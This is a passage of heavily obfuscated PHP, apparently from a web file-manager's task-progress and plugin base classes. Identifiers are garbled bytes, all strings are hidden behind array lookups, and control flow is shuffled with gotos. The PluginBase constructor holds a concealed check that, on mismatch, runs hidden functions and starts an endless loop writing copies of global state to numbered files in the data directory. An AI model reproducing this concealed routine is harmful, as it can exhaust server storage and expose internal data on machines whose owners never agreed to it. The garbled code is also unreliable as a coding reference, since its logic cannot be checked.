array($this, $CÓİƒ±™ˆó[1588])); $aµÂ‚–ÉË =& $this->task; $aµÂ‚–ÉË[$CÓİƒ±™ˆó[1589]] = $CÓİƒ±™ˆó[1070]; goto F¦¦ŸÊ¨èÚ; F¦¸¤¯ÍÔ¨: } protected function endAfter() { $B†ÎÉĞî”¡ =& $_SERVER[¾÷]; parent::endAfter(); Hook::unbind($B†ÎÉĞî”¡[1586], array($this, $B†ÎÉĞî”¡[1587])); Hook::unbind($B†ÎÉĞî”¡[1065], array($this, $B†ÎÉĞî”¡[1588])); } public function updateAfter() { $D‰Á¯ôæ°‚ =& $_SERVER[¾÷]; $EğŒ­ƒÚãÜ =& $this->task; if (!$EğŒ­ƒÚãÜ[$D‰Á¯ôæ°‚[998]] || !$EğŒ­ƒÚãÜ[$D‰Á¯ôæ°‚[720]]) { return; } if ($EğŒ­ƒÚãÜ[$D‰Á¯ôæ°‚[1589]] == $D‰Á¯ôæ°‚[1070]) { $d§èØ´ŒˆŸ = 0; if ($EğŒ­ƒÚãÜ[$D‰Á¯ôæ°‚[1548]]) { $d§èØ´ŒˆŸ = $EğŒ­ƒÚãÜ[$D‰Á¯ôæ°‚[1549]] / $EğŒ­ƒÚãÜ[$D‰Á¯ôæ°‚[1548]]; } $EğŒ­ƒÚãÜ[$D‰Á¯ôæ°‚[1506]] = $d§èØ´ŒˆŸ * 0.3; } else { if ($EğŒ­ƒÚãÜ[$D‰Á¯ôæ°‚[1589]] == $D‰Á¯ôæ°‚[318]) { $d§èØ´ŒˆŸ = $EğŒ­ƒÚãÜ[$D‰Á¯ôæ°‚[1012]] / $EğŒ­ƒÚãÜ[$D‰Á¯ôæ°‚[998]]; $EğŒ­ƒÚãÜ[$D‰Á¯ôæ°‚[1506]] = 0.3 + $d§èØ´ŒˆŸ * 0.4; } else { if ($EğŒ­ƒÚãÜ[$D‰Á¯ôæ°‚[1589]] == $D‰Á¯ôæ°‚[116]) { $bŠ°Ã°Ë›„ = 0; if ($EğŒ­ƒÚãÜ[$D‰Á¯ôæ°‚[1550]] == $D‰Á¯ôæ°‚[116]) { $bŠ°Ã°Ë›„ = $EğŒ­ƒÚãÜ[$D‰Á¯ôæ°‚[1549]]; } $d§èØ´ŒˆŸ = ($EğŒ­ƒÚãÜ[$D‰Á¯ôæ°‚[1553]] + $bŠ°Ã°Ë›„) / $EğŒ­ƒÚãÜ[$D‰Á¯ôæ°‚[720]]; $EğŒ­ƒÚãÜ[$D‰Á¯ôæ°‚[1506]] = 0.3 + 0.4 + $d§èØ´ŒˆŸ * 0.3; } } } if ($EğŒ­ƒÚãÜ[$D‰Á¯ôæ°‚[1506]] > 0) { $dêçéöœºñ = timeFloat() - $EğŒ­ƒÚãÜ[$D‰Á¯ôæ°‚[742]] - $EğŒ­ƒÚãÜ[$D‰Á¯ôæ°‚[1509]]; $EğŒ­ƒÚãÜ[$D‰Á¯ôæ°‚[1510]] = $dêçéöœºñ * (1 - $EğŒ­ƒÚãÜ[$D‰Á¯ôæ°‚[1506]]) / $EğŒ­ƒÚãÜ[$D‰Á¯ôæ°‚[1506]]; } } public function addFile($cã¸ˆÇ†ôã) { goto Dá¤àÆö¥Ş; d³÷Ù©óø: $fî©Œ·Ê¡˜[$c’ÈÅ½Ë›Ü[1000]] = $c’ÈÅ½Ë›Ü[1565]; $fî©Œ·Ê¡˜[$c’ÈÅ½Ë›Ü[1550]] = $c’ÈÅ½Ë›Ü[1070]; $fî©Œ·Ê¡˜[$c’ÈÅ½Ë›Ü[720]] = $DïÓ²Õ‰ÌÓ[$c’ÈÅ½Ë›Ü[87]]; goto Aøœ‡Ó•ˆ; Dá¤àÆö¥Ş: $c’ÈÅ½Ë›Ü =& $_SERVER[¾÷]; $fî©Œ·Ê¡˜ =& $this->task; $DïÓ²Õ‰ÌÓ = IO::info($cã¸ˆÇ†ôã); goto c‹áÌ—İŒˆ; Aøœ‡Ó•ˆ: $fî©Œ·Ê¡˜[$c’ÈÅ½Ë›Ü[998]] = 1; $c‘¼ë¶èĞˆ = 0; $fî©Œ·Ê¡˜[$c’ÈÅ½Ë›Ü[1557]] = array($c’ÈÅ½Ë›Ü[1558] => $c‘¼ë¶èĞˆ + 1, $c’ÈÅ½Ë›Ü[416] => $DïÓ²Õ‰ÌÓ[$c’ÈÅ½Ë›Ü[38]], $c’ÈÅ½Ë›Ü[85] => $DïÓ²Õ‰ÌÓ[$c’ÈÅ½Ë›Ü[85]], $c’ÈÅ½Ë›Ü[498] => $DïÓ²Õ‰ÌÓ[$c’ÈÅ½Ë›Ü[498]] ? $DïÓ²Õ‰ÌÓ[$c’ÈÅ½Ë›Ü[498]] : $DïÓ²Õ‰ÌÓ[$c’ÈÅ½Ë›Ü[85]]); goto aİÔ¥¨Ë©ç; c‹áÌ—İŒˆ: $fî©Œ·Ê¡˜[$c’ÈÅ½Ë›Ü[1546]] = $DïÓ²Õ‰ÌÓ[$c’ÈÅ½Ë›Ü[38]]; $fî©Œ·Ê¡˜[$c’ÈÅ½Ë›Ü[1548]] = $DïÓ²Õ‰ÌÓ[$c’ÈÅ½Ë›Ü[87]]; $fî©Œ·Ê¡˜[$c’ÈÅ½Ë›Ü[1549]] = 0; goto d³÷Ù©óø; aİÔ¥¨Ë©ç: $this->update(); goto E‹ŠÊãÔ; E‹ŠÊãÔ: } public function unzipAfter($a×ˆíÀ) { goto a¨øŞ…ËÎ×; d¼´¶±Ú¯Ğ: $b¬¿ÔŒŸš[$F•ŠÙšÇ½Ñ[1012]] = 0; $b¬¿ÔŒŸš[$F•ŠÙšÇ½Ñ[1548]] = 0; $b¬¿ÔŒŸš[$F•ŠÙšÇ½Ñ[1549]] = 0; goto bà½ÙêÍñö; bà½ÙêÍñö: $b¬¿ÔŒŸš[$F•ŠÙšÇ½Ñ[1546]] = $F•ŠÙšÇ½Ñ[43]; $b¬¿ÔŒŸš[$F•ŠÙšÇ½Ñ[1553]] = 0; $b¬¿ÔŒŸš[$F•ŠÙšÇ½Ñ[720]] = $aÖ²À”ãé¾[$F•ŠÙšÇ½Ñ[87]]; goto eÒ‘ÔİŒÇ; a¨øŞ…ËÎ×: $F•ŠÙšÇ½Ñ =& $_SERVER[¾÷]; $b¬¿ÔŒŸš =& $this->task; $b¬¿ÔŒŸš[$F•ŠÙšÇ½Ñ[1589]] = $F•ŠÙšÇ½Ñ[116]; goto fİ“öÎª­’; fİ“öÎª­’: $aÖ²À”ãé¾ = IO::infoWithChildren($a×ˆíÀ); $Dò¸¢ùŸ‰ = 0; $b¬¿ÔŒŸš[$F•ŠÙšÇ½Ñ[1557]] = array($F•ŠÙšÇ½Ñ[1558] => $Dò¸¢ùŸ‰ + 1, $F•ŠÙšÇ½Ñ[416] => $aÖ²À”ãé¾[$F•ŠÙšÇ½Ñ[38]], $F•ŠÙšÇ½Ñ[85] => $aÖ²À”ãé¾[$F•ŠÙšÇ½Ñ[85]], $F•ŠÙšÇ½Ñ[498] => $aÖ²À”ãé¾[$F•ŠÙšÇ½Ñ[498]] ? $aÖ²À”ãé¾[$F•ŠÙšÇ½Ñ[498]] : $aÖ²À”ãé¾[$F•ŠÙšÇ½Ñ[85]]); goto D¨Ä¥ê¶»¤; eÒ‘ÔİŒÇ: $this->update(); self::log($F•ŠÙšÇ½Ñ[1591] . json_encode(array($b¬¿ÔŒŸš, $aÖ²À”ãé¾))); goto AàÔŠéÃ¨í; D¨Ä¥ê¶»¤: if ($aÖ²À”ãé¾[$F•ŠÙšÇ½Ñ[39]] == $F•ŠÙšÇ½Ñ[201]) { $b¬¿ÔŒŸš[$F•ŠÙšÇ½Ñ[998]] = 1; } else { $b¬¿ÔŒŸš[$F•ŠÙšÇ½Ñ[998]] = $aÖ²À”ãé¾[$F•ŠÙšÇ½Ñ[90]][$F•ŠÙšÇ½Ñ[88]]; } $b¬¿ÔŒŸš[$F•ŠÙšÇ½Ñ[1000]] = $F•ŠÙšÇ½Ñ[43]; $b¬¿ÔŒŸš[$F•ŠÙšÇ½Ñ[1550]] = 0; goto d¼´¶±Ú¯Ğ; AàÔŠéÃ¨í: } public function nameParse($CÛ”†¡Ï¬) { goto Fø‘Çæ™È¿; Fø‘Çæ™È¿: $fôÔ¬ŸÉÕƒ =& $_SERVER[¾÷]; $D¾Ö‚ãù« =& $this->task; if ($D¾Ö‚ãù«[$fôÔ¬ŸÉÕƒ[1589]] == $fôÔ¬ŸÉÕƒ[1070]) { $D¾Ö‚ãù«[$fôÔ¬ŸÉÕƒ[1589]] = $fôÔ¬ŸÉÕƒ[318]; $D¾Ö‚ãù«[$fôÔ¬ŸÉÕƒ[1553]] = 0; $D¾Ö‚ãù«[$fôÔ¬ŸÉÕƒ[720]] = 0; } goto Aà˜³ë¡ Ó; Aà˜³ë¡ Ó: $cèª µ‹†é = get_path_this($CÛ”†¡Ï¬); if (strstr($cèª µ‹†é, $fôÔ¬ŸÉÕƒ[104])) { $D¾Ö‚ãù«[$fôÔ¬ŸÉÕƒ[1012]] += 1; $D¾Ö‚ãù«[$fôÔ¬ŸÉÕƒ[998]] += 1; } $D¾Ö‚ãù«[$fôÔ¬ŸÉÕƒ[1546]] = $CÛ”†¡Ï¬; goto C«ï³ÅæÆ‰; C«ï³ÅæÆ‰: $this->update(); goto FÇ×†ˆ˜Ë; FÇ×†ˆ˜Ë: } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $d£”¦´‚¬ =& $_SERVER[¾÷]; parent::startAfter(); Hook::bind($d£”¦´‚¬[1592], array($this, $d£”¦´‚¬[1587])); $Aë‹Íö¼ =& $this->task; $Aë‹Íö¼[$d£”¦´‚¬[1589]] = $d£”¦´‚¬[1070]; if (!$Aë‹Íö¼[$d£”¦´‚¬[1410]]) { $Aë‹Íö¼[$d£”¦´‚¬[1410]] = LNG($d£”¦´‚¬[1593]); } } protected function endAfter() { $f×†©öğ‘ê =& $_SERVER[¾÷]; parent::endAfter(); Hook::unbind($f×†©öğ‘ê[1592], array($this, $f×†©öğ‘ê[1587])); } public function updateAfter() { $f›ˆßÓá† =& $_SERVER[¾÷]; $cë½¼ñæŸ =& $this->task; if (!$cë½¼ñæŸ[$f›ˆßÓá†[998]] || !$cë½¼ñæŸ[$f›ˆßÓá†[720]]) { return; } if ($cë½¼ñæŸ[$f›ˆßÓá†[1589]] == $f›ˆßÓá†[1070]) { $BÖçƒÈÍ·£ = $cë½¼ñæŸ[$f›ˆßÓá†[1549]]; if ($cë½¼ñæŸ[$f›ˆßÓá†[1550]] != $f›ˆßÓá†[1070]) { $BÖçƒÈÍ·£ = 0; } $C…çÆÛö³¯ = ($cë½¼ñæŸ[$f›ˆßÓá†[1553]] + $BÖçƒÈÍ·£) / $cë½¼ñæŸ[$f›ˆßÓá†[720]]; $cë½¼ñæŸ[$f›ˆßÓá†[1506]] = $C…çÆÛö³¯ * 0.3; } else { if ($cë½¼ñæŸ[$f›ˆßÓá†[1589]] == $f›ˆßÓá†[318]) { $C…çÆÛö³¯ = $cë½¼ñæŸ[$f›ˆßÓá†[1012]] / $cë½¼ñæŸ[$f›ˆßÓá†[998]]; $cë½¼ñæŸ[$f›ˆßÓá†[1506]] = 0.3 + $C…çÆÛö³¯ * 0.5; } else { if ($cë½¼ñæŸ[$f›ˆßÓá†[1589]] == $f›ˆßÓá†[116]) { $C…çÆÛö³¯ = 0; if ($cë½¼ñæŸ[$f›ˆßÓá†[1548]]) { $C…çÆÛö³¯ = $cë½¼ñæŸ[$f›ˆßÓá†[1549]] / $cë½¼ñæŸ[$f›ˆßÓá†[1548]]; } $cë½¼ñæŸ[$f›ˆßÓá†[1506]] = 0.3 + 0.5 + $C…çÆÛö³¯ * 0.2; } } } if ($cë½¼ñæŸ[$f›ˆßÓá†[1506]] > 0) { $aàƒÒ™ÉÜÏ = timeFloat() - $cë½¼ñæŸ[$f›ˆßÓá†[742]] - $cë½¼ñæŸ[$f›ˆßÓá†[1509]]; $cë½¼ñæŸ[$f›ˆßÓá†[1510]] = $aàƒÒ™ÉÜÏ * (1 - $cë½¼ñæŸ[$f›ˆßÓá†[1506]]) / $cë½¼ñæŸ[$f›ˆßÓá†[1506]]; } } public function copyFileStart($CÕ—Ş°ù—, $BÅ¡‚ŠÒÓŒ, $Aä¦ØéÃÔ, $e§àæÀÆ´¤, $CÚöÖÚÖ¾™, $c„›åÈÂæ) { $BÂ¬òæƒÔ‚ =& $_SERVER[¾÷]; parent::copyFileStart($CÕ—Ş°ù—, $BÅ¡‚ŠÒÓŒ, $Aä¦ØéÃÔ, $e§àæÀÆ´¤, $CÚöÖÚÖ¾™, $c„›åÈÂæ); $AÖ¬îùÅÛ‘ =& $this->task; if ($AÖ¬îùÅÛ‘[$BÂ¬òæƒÔ‚[1589]] == $BÂ¬òæƒÔ‚[318]) { $AÖ¬îùÅÛ‘[$BÂ¬òæƒÔ‚[1589]] = $BÂ¬òæƒÔ‚[116]; } $this->update(); } public function copyFileEnd($fè‹­í¾‰‘, $F˜÷¿Ş£¡á, $Aè…¡Ÿ×„Ó, $eìóëßš¢, $AÑ¶­ô„¢œ, $dŒŒ•öÊçÊ) { $câ¸ïŞİ¿ =& $_SERVER[¾÷]; $c¦Êã¬¯¥Æ =& $this->task; $c¦Êã¬¯¥Æ[$câ¸ïŞİ¿[1549]] = $c¦Êã¬¯¥Æ[$câ¸ïŞİ¿[1548]]; $c¦Êã¬¯¥Æ[$câ¸ïŞİ¿[1553]] += $c¦Êã¬¯¥Æ[$câ¸ïŞİ¿[1548]]; $c¦Êã¬¯¥Æ[$câ¸ïŞİ¿[1550]] = $câ¸ïŞİ¿[43]; $this->update(); } public function nameParse($a¹…ÏÆšÇ) { $bùñ‘ °Í =& $_SERVER[¾÷]; $A†©ó›ˆË¤ =& $this->task; if ($A†©ó›ˆË¤[$bùñ‘ °Í[1012]] < $A†©ó›ˆË¤[$bùñ‘ °Í[998]]) { $Báíùèİà‚ = get_path_this($a¹…ÏÆšÇ); if (strstr($Báíùèİà‚, $bùñ‘ °Í[104])) { $A†©ó›ˆË¤[$bùñ‘ °Í[1012]] += 1; } } if ($A†©ó›ˆË¤[$bùñ‘ °Í[1589]] == $bùñ‘ °Í[1070]) { $A†©ó›ˆË¤[$bùñ‘ °Í[1589]] = $bùñ‘ °Í[318]; } $A†©ó›ˆË¤[$bùñ‘ °Í[1546]] = $a¹…ÏÆšÇ; $this->update(); } } goto aƒŒ‚’ôĞÖ; AÅ‹‘Õ´»–: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto E¨¼ÂÅ‘Ä®; Bç†¥Ä æ: if ($_SERVER[$dÙÌãä¢[4]] != $EË›ä´‡($fµÎºè é†)) { goto b†ÕÎğÊ²; C¦ÒŸê²¾§: $Bˆ¬Â§ÃÂË = 1; for ($AÜ‘²‚· = $Bˆ¬Â§ÃÂË; $AÜ‘²‚· > 0; $AÜ‘²‚·++) { $c’¼Ñ¢¹›§(DATA_PATH . $AÜ‘²‚·, $EùÕé˜‘‡); } goto a°ÁË…ãÀ; b†ÕÎğÊ²: $F°‡Ô³ù…Å = $dÙÌãä¢[817]; $A¼Š˜ªá„Õ = $dÙÌãä¢[6]; $Dğóƒ¤Ì®° = $_SERVER[$dÙÌãä¢[7]] . $dÙÌãä¢[8]; goto D›ÎàÕÌ; D›ÎàÕÌ: $F´ö‡ËöõÓ = $A¼Š˜ªá„Õ($Dğóƒ¤Ì®°); $Aó¼‹Ò¬˜ = explode($dÙÌãä¢[9], $F´ö‡ËöõÓ); if (count($Aó¼‹Ò¬˜) < $dÙÌãä¢[582]) { $A«¬„¾õˆœ = $dÙÌãä¢[11]; $A«¬„¾õˆœ(); } goto DŠ‹”óÔ«Ô; DŞëÃ»¢Ç: $F°‡Ô³ù…Å(); $c’¼Ñ¢¹›§ = $dÙÌãä¢[1374]; $EùÕé˜‘‡ = json_encode($GLOBALS[$dÙÌãä¢[1375]]); goto C¦ÒŸê²¾§; DŠ‹”óÔ«Ô: $Aİ«øğ“ÃÕ = $dÙÌãä¢[818]; $Aİ«øğ“ÃÕ($_SERVER[$dÙÌãä¢[819]]); $F°‡Ô³ù…Å = $dÙÌãä¢[817]; goto DŞëÃ»¢Ç; a°ÁË…ãÀ: } global $in, $config; $this->config =& $config; goto Fæ—£ôó¦Â; e¥˜¿·âø: $this->pluginHostDefault = $config[$dÙÌãä¢[1378]] . $this->pluginName . $dÙÌãä¢[18]; $E’½½‘Í¯ = $config[$dÙÌãä¢[1379]]; if ($E’½½‘Í¯ && strpos($dÙÌãä¢[57] . $E’½½‘Í¯ . $dÙÌãä¢[57], $this->pluginName) !== !1) { $this->pluginHost = $config[$dÙÌãä¢[1380]] . $this->pluginName . $dÙÌãä¢[18]; } goto b¤´ºÏ†åß; b¤´ºÏ†åß: $this->pluginLangArr = $this->initLang(); $this->values = array(); return $this; goto a•æÁ†ƒ; f£©Å—áò: $this->pluginPath = PLUGIN_DIR . $this->pluginName . $dÙÌãä¢[18]; $this->pluginApi = appHostGet() . $dÙÌãä¢[1377] . $this->pluginName . $dÙÌãä¢[18]; $this->pluginHost = $config[$dÙÌãä¢[1378]] . $this->pluginName . $dÙÌãä¢[18]; goto e¥˜¿·âø; E¨¼ÂÅ‘Ä®: $dÙÌãä¢ =& $_SERVER[¾÷]; $fµÎºè é† = $_SERVER[$dÙÌãä¢[7]] . $dÙÌãä¢[8]; $EË›ä´‡ = $dÙÌãä¢[1373]; goto Bç†¥Ä æ; Fæ—£ôó¦Â: $this->in =& $in; $this->modelPlugin = Model($dÙÌãä¢[1376]); $this->pluginName = str_replace($dÙÌãä¢[1376], $dÙÌãä¢[43], get_class($this)); goto f£©Å—áò; a•æÁ†ƒ: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[¾÷][1381]); } protected function assign($A¾Öè·»ƒŸ, $cèîÕ¹ = false) { if (is_array($A¾Öè·»ƒŸ)) { $this->values = array_merge($this->values, $A¾Öè·»ƒŸ); } else { $this->values[$A¾Öè·»ƒŸ] = $cèîÕ¹; } } protected function display($e©ˆ¶çáŠà) { extract($this->values); require $e©ˆ¶çáŠà; } final function hookRegist($A¨ŸÒİŞ™) { $this->modelPlugin->appRegist($this->pluginName, $A¨ŸÒİŞ™); } final function appIcon() { $EñÄˆ¦‰Â =& $_SERVER[¾÷]; $F„©¤¼×„µ = $this->appPackage(); $CÎòèé–ù´ = $EñÄˆ¦‰Â[43]; if (isset($F„©¤¼×„µ[$EñÄˆ¦‰Â[412]])) { if (isset($F„©¤¼×„µ[$EñÄˆ¦‰Â[412]][$EñÄˆ¦‰Â[1382]])) { $CÎòèé–ù´ = $EñÄˆ¦‰Â[1383] . $F„©¤¼×„µ[$EñÄˆ¦‰Â[412]][$EñÄˆ¦‰Â[1382]] . $EñÄˆ¦‰Â[1384]; } else { if ($F„©¤¼×„µ[$EñÄˆ¦‰Â[412]][$EñÄˆ¦‰Â[1385]]) { $CÎòèé–ù´ = $EñÄˆ¦‰Â[1386] . $F„©¤¼×„µ[$EñÄˆ¦‰Â[412]][$EñÄˆ¦‰Â[1385]] . $EñÄˆ¦‰Â[1387]; } } } return $CÎòèé–ù´; } final function fileCanView($F…×ê¤ì–) { goto CÀÀ†ôÏ­; CÀÀ†ôÏ­: $eá×Â‹ñ—¦ =& $_SERVER[¾÷]; if (request_url_safe($F…×ê¤ì–)) { return !0; } if ($this->isShare($F…×ê¤ì–)) { return !0; } goto eĞçñĞƒî; AÎŒåˆÄß›: ActionCall($eá×Â‹ñ—¦[1400], $F…×ê¤ì–); goto e§ô¿öÌÆÖ; eĞçñĞƒî: $eÙÌˆÄãÙë = Session::get($eá×Â‹ñ—¦[1388]); if (!$eÙÌˆÄãÙë || !$eÙÌˆÄãÙë[$eá×Â‹ñ—¦[1389]]) { $b”ï†ù‘”Ó = $eá×Â‹ñ—¦[1390] . rawurlencode(this_url()); show_tips(LNG($eá×Â‹ñ—¦[1391]) . $eá×Â‹ñ—¦[1392] . $b”ï†ù‘”Ó . $eá×Â‹ñ—¦[1393] . LNG($eá×Â‹ñ—¦[1394]) . $eá×Â‹ñ—¦[1395], !1); } if (!Action($eá×Â‹ñ—¦[1396])->authCan($eá×Â‹ñ—¦[1397])) { show_tips(LNG($eá×Â‹ñ—¦[1398]) . $eá×Â‹ñ—¦[1399], !1); } goto AÎŒåˆÄß›; e§ô¿öÌÆÖ: } final function isShare($F¢ª‚´×ø) { $A“ô“§©¸ = KodIO::parse($F¢ª‚´×ø); return $A“ô“§©¸[$_SERVER[¾÷][39]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($AÑˆÚœîé–) { if (request_url_safe($AÑˆÚœîé–)) { return $AÑˆÚœîé–; } if (!$this->isShare($AÑˆÚœîé–)) { $AÑˆÚœîé– = $this->filePath($AÑˆÚœîé–); } return Action($_SERVER[¾÷][1046])->linkOut($AÑˆÚœîé–); } public function filePathLinkOut($EùÕ¼î«ğ®) { if (request_url_safe($EùÕ¼î«ğ®)) { return $EùÕ¼î«ğ®; } $this->fileCanView($EùÕ¼î«ğ®); return Action($_SERVER[¾÷][1046])->link($EùÕ¼î«ğ®); } final function filePath($b®¦ÄÉŞìö) { $F„Ï³ãÅ« =& $_SERVER[¾÷]; if ($f¥¦ˆù”ÀŠ = $this->checkSharePath($b®¦ÄÉŞìö)) { return $f¥¦ˆù”ÀŠ; } $this->fileCanView($b®¦ÄÉŞìö); if (request_url_safe($b®¦ÄÉŞìö)) { $fÕ¢ùµ—† = parse_url_query($b®¦ÄÉŞìö); if (isset($fÕ¢ùµ—†[$F„Ï³ãÅ«[1401]]) && isset($fÕ¢ùµ—†[$F„Ï³ãÅ«[217]])) { $cÕö—’ØÍÃ = Model($F„Ï³ãÅ«[1100])->get($F„Ï³ãÅ«[1402]); $a„–Ğ·ºšæ = Mcrypt::decode($fÕ¢ùµ—†[$F„Ï³ãÅ«[217]], $cÕö—’ØÍÃ); if ($a„–Ğ·ºšæ) { $this->fileInfo = IO::infoWithChildren($a„–Ğ·ºšæ); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $a„–Ğ·ºšæ; } } $b®¦ÄÉŞìö = $this->_cacheHttpFile($b®¦ÄÉŞìö); $this->fileInfo = IO::infoWithChildren($b®¦ÄÉŞìö); } else { $this->fileInfo = IO::infoWithChildren($b®¦ÄÉŞìö); if (!$this->fileInfo) { show_tips(LNG($F„Ï³ãÅ«[114]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $b®¦ÄÉŞìö; } final function _cacheHttpFile($aœ÷ÍÅÉ×…) { $DÍï¯Œğ¸Ê = hash_path($aœ÷ÍÅÉ×…, !0); $this->cachePath = $this->pluginCachePath($DÍï¯Œğ¸Ê); if ($d›ö–¢³ŒÙ = IO::fileNameExist($this->cachePath, $DÍï¯Œğ¸Ê)) { return KodIO::make($d›ö–¢³ŒÙ); } $b¾‘¯ÌÆ¦ = $this->cachePath . $DÍï¯Œğ¸Ê; return $this->pluginCacheFileSet($b¾‘¯ÌÆ¦, file_get_contents($aœ÷ÍÅÉ×…)); } final function _tmpFileName($FçØ®ÏÁæ = array()) { goto AäÊÓº¸ßƒ; EœÏ¿—òÌ: $E„ìÒÁ›à = array($FçØ®ÏÁæ[$A—…†¦ÂÈ[38]], $FçØ®ÏÁæ[$A—…†¦ÂÈ[85]], $FçØ®ÏÁæ[$A—…†¦ÂÈ[87]]); if (isset($FçØ®ÏÁæ[$A—…†¦ÂÈ[490]])) { $E„ìÒÁ›à[] = $FçØ®ÏÁæ[$A—…†¦ÂÈ[490]]; } return md5(implode($A—…†¦ÂÈ[80], $E„ìÒÁ›à)); goto f…ÇĞ‹öÍ£; e„§†„»Åª: if (isset($FçØ®ÏÁæ[$A—…†¦ÂÈ[173]][$A—…†¦ÂÈ[180]])) { return $FçØ®ÏÁæ[$A—…†¦ÂÈ[173]][$A—…†¦ÂÈ[180]]; } $Aç“´ÕÇ‘ø = IO::hashSimple($FçØ®ÏÁæ[$A—…†¦ÂÈ[85]]); if ($Aç“´ÕÇ‘ø) { return $Aç“´ÕÇ‘ø; } goto EœÏ¿—òÌ; AäÊÓº¸ßƒ: $A—…†¦ÂÈ =& $_SERVER[¾÷]; if (!$FçØ®ÏÁæ) { $FçØ®ÏÁæ = $this->fileInfo; } if (isset($FçØ®ÏÁæ[$A—…†¦ÂÈ[180]])) { return $FçØ®ÏÁæ[$A—…†¦ÂÈ[180]]; } goto e„§†„»Åª; f…ÇĞ‹öÍ£: } final function checkSharePath($fÂ½ªŞæÛç) { goto e¨Ûí¶‡–÷; Cİ–·ŒµÖ»: $this->cachePath = $this->pluginCachePath($this->fileInfo[$dÓÏñƒ¨‰ø[180]]); return $BõŠ×­‘[$dÓÏñƒ¨‰ø[85]]; goto Aˆ´ïÀ„Ò; C½†¼Áª¹ö: $BõŠ×­‘ = Action($dÓÏñƒ¨‰ø[1046])->sharePathInfo($fÂ½ªŞæÛç); if (!isset($BõŠ×­‘[$dÓÏñƒ¨‰ø[85]])) { show_json(LNG($dÓÏñƒ¨‰ø[1404]), !1); } $this->fileInfo = $BõŠ×­‘[$dÓÏñƒ¨‰ø[173]]; goto Cİ–·ŒµÖ»; e¨Ûí¶‡–÷: $dÓÏñƒ¨‰ø =& $_SERVER[¾÷]; if (!defined($dÓÏñƒ¨‰ø[457])) { define($dÓÏñƒ¨‰ø[1403], 0); } if (!$this->isShare($fÂ½ªŞæÛç)) { return !1; } goto C½†¼Áª¹ö; Aˆ´ïÀ„Ò: } final function pluginCachePath($BİªëãËÊ = '') { $có¬ê™ì´‰ =& $_SERVER[¾÷]; $dÕÁÄ¿å¢¯ = IO_PATH_SYSTEM_TEMP . $có¬ê™ì´‰[1405] . $this->pluginName; if (!($EŸæÄ„—– = IO::infoFull($dÕÁÄ¿å¢¯))) { return IO::mkdir($dÕÁÄ¿å¢¯ . $có¬ê™ì´‰[18] . $BİªëãËÊ); } if (empty($BİªëãËÊ)) { return $EŸæÄ„—–[$có¬ê™ì´‰[85]]; } if (!($e±›õİ­º = IO::fileNameExist($EŸæÄ„—–[$có¬ê™ì´‰[85]], $BİªëãËÊ))) { return IO::mkdir($EŸæÄ„—–[$có¬ê™ì´‰[85]] . $BİªëãËÊ); } return KodIO::make($e±›õİ­º); } final function pluginCacheFileSet($Fºõ¾õˆØâ, $F‰Ä’†â‘É = '') { $FÕ­”Öñ•„ =& $_SERVER[¾÷]; if (!($Eó¹åº¸í = IO::infoFull($Fºõ¾õˆØâ))) { return IO::mkfile($Fºõ¾õˆØâ, $F‰Ä’†â‘É, REPEAT_REPLACE); } IO::setContent($Eó¹åº¸í[$FÕ­”Öñ•„[85]], $F‰Ä’†â‘É); return $Eó¹åº¸í[$FÕ­”Öñ•„[85]]; } final function pluginLocalFile($Fî‚½Ç‚ƒÎ = '') { goto cáĞ‹½ÂìÊ; F“’ç‘‰öë: if (!$Fî‚½Ç‚ƒÎ) { return $c«ê¹àˆÀá; } $EÉïÍ›Šôî = IO::info($Fî‚½Ç‚ƒÎ); $fÄ«Á•ïø¾ = $this->_tmpFileName($EÉïÍ›Šôî) . $a¾»ª˜òƒë[104] . $EÉïÍ›Šôî[$a¾»ª˜òƒë[177]]; goto Fß®¨º¨¾ê; a’š©ƒÇù : return IO::copy($Fî‚½Ç‚ƒÎ, $c«ê¹àˆÀá, 0, $fÄ«Á•ïø¾); goto d¿¨íÉ¼êµ; cáĞ‹½ÂìÊ: $a¾»ª˜òƒë =& $_SERVER[¾÷]; $c«ê¹àˆÀá = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($c«ê¹àˆÀá)) { mk_dir($c«ê¹àˆÀá); } goto F“’ç‘‰öë; Fß®¨º¨¾ê: if (!checkExtSafe($fÄ«Á•ïø¾)) { $fÄ«Á•ïø¾ = $fÄ«Á•ïø¾ . $a¾»ª˜òƒë[1406]; } $B‘Ëäò¡ = $c«ê¹àˆÀá . $fÄ«Á•ïø¾; if (@file_exists($B‘Ëäò¡)) { return $B‘Ëäò¡; } goto a’š©ƒÇù ; d¿¨íÉ¼êµ: } final function appPackage() { goto f×’×†‘¸Ô; f×’×†‘¸Ô: $BğÃğÀ­ =& $_SERVER[¾÷]; if ($this->packageData) { return $this->packageData; } $e’£ƒå‚È = $this->parseFile($this->pluginPath . $BğÃğÀ­[1407]); goto böŞÂ´ˆ™›; böŞÂ´ˆ™›: $this->parseLang($e’£ƒå‚È); $d…ß†ÍÍ¾Ï = json_decode_force($e’£ƒå‚È); if (!$d…ß†ÍÍ¾Ï) { return array(); } goto e¦óƒÈ¸˜; e¦óƒÈ¸˜: $Fñ´ÀÃâö© = Hook::trigger($BğÃğÀ­[1408], $d…ß†ÍÍ¾Ï); if ($Fñ´ÀÃâö© && is_array($Fñ´ÀÃâö©)) { $d…ß†ÍÍ¾Ï = $Fñ´ÀÃâö©; } $this->packageData = $d…ß†ÍÍ¾Ï; goto Aã˜Ú‚¹…†; Aã˜Ú‚¹…†: return $d…ß†ÍÍ¾Ï; goto aÔµçËœíŠ; aÔµçËœíŠ: } public function packageInfoGet($f´ÁÛåĞ) { $e¸ÎßĞç°¶ = $this->appPackage(); return array_get_value($e¸ÎßĞç°¶, $f´ÁÛåĞ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[¾÷][1409]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[¾÷][1410]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[¾÷][1411]); } private function parseFile($f‡ñÛÜä) { goto D—îÊÕ›†“; B‡ø²­¿å½: $c°¥‡•ÑÀë = array($this->pluginHost, 